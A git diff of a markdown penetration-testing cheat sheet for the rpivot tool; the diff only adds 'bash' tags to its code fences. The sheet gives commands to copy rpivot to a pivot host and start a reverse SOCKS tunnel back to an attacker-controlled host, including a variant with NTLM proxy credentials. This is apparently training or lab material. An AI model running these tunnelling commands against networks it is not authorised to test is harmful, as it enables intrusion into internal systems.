@@ -4,13 +4,13 @@
 ---
 ## Setup
 
-```
+```bash
 git clone https://github.com/klsecservices/rpivot.git
 ```
 
 Clone the rpivot repository on the attack host.
 
-```
+```bash
 scp -r rpivot ubuntu@<target>:/home/ubuntu/
 ```
 
@@ -19,19 +19,19 @@ Transfer the rpivot directory to the pivot host.
 ---
 ## SOCKS Tunnel
 
-```
+```bash
 python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
 ```
 
 Start the rpivot server on the attack host. `--proxy-port` local SOCKS proxy port, `--server-port` port the client connects back to, `--server-ip` interface to listen on.
 
-```
+```bash
 python2.7 client.py --server-ip <lhost> --server-port 9999
 ```
 
 Run on the pivot host. Connects back to the attack host and establishes the SOCKS tunnel.
 
-```
+```bash
 proxychains firefox-esr <target>:80
 ```
 
@@ -40,7 +40,7 @@ Browse to the internal web server through the tunnel.
 ---
 ## NTLM Proxy Authentication
 
-```
+```bash
 python client.py --server-ip <target> --server-port 8080 --ntlm-proxy-ip <proxy-ip> --ntlm-proxy-port 8081 --domain <domain> --username <user> --password <password>
 ```
 
